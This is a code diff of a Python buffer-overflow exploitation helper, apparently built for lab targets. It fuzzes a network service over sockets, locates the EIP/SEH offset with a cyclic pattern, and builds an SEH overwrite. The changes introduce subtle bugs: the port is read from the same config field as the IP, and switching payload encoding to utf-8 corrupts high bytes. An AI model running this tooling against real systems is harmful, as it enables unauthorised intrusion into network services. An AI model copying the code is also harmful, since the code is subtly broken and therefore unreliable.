@@ -11,39 +11,41 @@ class Exploit:
     def ipValidate(ip):
         if(ip.count('.')!=3):
             return False
-        addresses = ip.split('.') #I forgot my vocab
-        for address in addresses:
+        octets = ip.split('.') 
+        for address in octets:
             try:
                 if(int(address)<0 or int(address)>255):
-                    #print("high number")
                     return False
             except:
                 return False
         return True
 
+    #For Make new first option whether the binary is local, second option is the location
     def openSave(self):
         try:
             with open("bof-config.txt", "r") as save:
                 config = save.read().split('| |')#change
-                #Format: ip, port, time, arch, prefix
-                if len(config) != 5:
+                #Format: is_local, path, ip, port, time, arch, prefix, sequences to vuln(to add later)
+                if len(config) != 7:
                     self.loadedFile=False
                     self.loadFromFileTrue='n'
                     return
-                ip = config[0]
+                is_local = True if config[0].lower()=="y" else False
+                local_path = config[1]
+                ip = config[2]
                 self.ip = ip.strip()
                 if not Exploit.ipValidate(ip):
-                    self.ip = "10.0.2.15"
+                    self.ip = "10.0.2.15" #Default VirtualBox IPv4
                 try:
-                    self.port = int(config[1].strip())
+                    self.port = int(config[2].strip())
                     if(self.port<1 or self.port>65535):
                         self.port = 80
                         #add print
                 except:
                     self.port = 80
-                self.timeout = config[2] #will change later
-                self.isHarderArch = config[3]=='y'
-                self.prefix = config[4]#Verify number of elements
+                self.timeout = config[4] #will change later
+                self.isHarderArch = config[5]=='y'
+                self.prefix = config[6]#Verify number of elements
                 self.loadedFile = True
         except:
             self.loadFromFileTrue = False
@@ -193,14 +195,6 @@ class Exploit:
     def espDifference(esp, currentAddr):
         return currentAddr-esp
 
-    #Useless Method
-    #@staticmethod
-        #def bytesAlt(string):
-        #esult = b""
-        #for i in range (0, len(string), 2):
-            #result += b"\x{}".format(string[i:i+2])
-        #return result
-
     def sehOverflow(self):
         exactOffset = Exploit.betterIntInput("Enter the offset to the handler\n> ", 0, 1000000)
         seh = input("Enter SEH replacement address in little-endian, ignore the \\x:\n> ")
@@ -242,7 +236,7 @@ class Exploit:
                     break
                 s.recv(1024)
                 print("\x1b[46m\x1b[30mFuzzing with {} bytes\x1b[0m".format(len(string) - len(self.prefix)))
-                s.send(bytes(string, "latin-1"))
+                s.send(bytes(string, "utf-8"))
                 s.recv(1024)
             except KeyboardInterrupt:
                 break
@@ -270,17 +264,14 @@ class Exploit:
             print("\x1b[31mCould not connect to target")
             print("\x1b[0m")
         print("Sending pattern to EIP")
-        s.send(bytes(buffer + "\r\n", "latin-1"))
+        s.send(bytes(buffer + "\r\n", "utf-8"))
         print("Done! Check EIP/SEH Value in your debugger")
 
         while True:
             EIPattern = input("What is the EIP/SEH Value?\n> ")
             EIPatternStr = str(EIPattern)
             try:
-                EIPB = bytes.fromhex(EIPatternStr)
-                EIPA = EIPB.decode("ascii")
-                SEIP = str(EIPA)
-                trueEIP = SEIP[::-1]
+                trueEIP = str(bytes.fromhex(EIPatternStr).decode("ascii"))[::-1]
                 fixit = longpattern.find(trueEIP)
                 final = int(fixit)
                 print("Accurate Offset Is:")
@@ -303,7 +294,7 @@ class Exploit:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((self.ip, self.port))
             print("Sending hex array to EIP")
-            s.send(bytes(buffer + "\r\n", "latin-1"))
+            s.send(bytes(buffer + "\r\n", "utf-8"))
             print("Done! Check ESP Hex Dump in your debugger")
         except:
             print("Could not connect.")
@@ -318,7 +309,7 @@ class Exploit:
                 s.connect((self.ip, self.port))
                 s.recv(1024)
                 print("Fuzzing with {} bytes".format(len(string) - len(self.prefix)))
-                s.send(bytes(string, "latin-1"))
+                s.send(bytes(string, "utf-8"))
                 s.recv(1024)
             except:
                 print("Offset at {} bytes".format(len(string) - len(self.prefix) - 4))
@@ -365,7 +356,7 @@ def constructExploit():
     try:
         bof.getData()
         if(bof.isHarderArch):
-            print("64-bit support will be added later")
+            print("64-bit support later")
         else:
             bof.mainExploit()
     except KeyboardInterrupt:
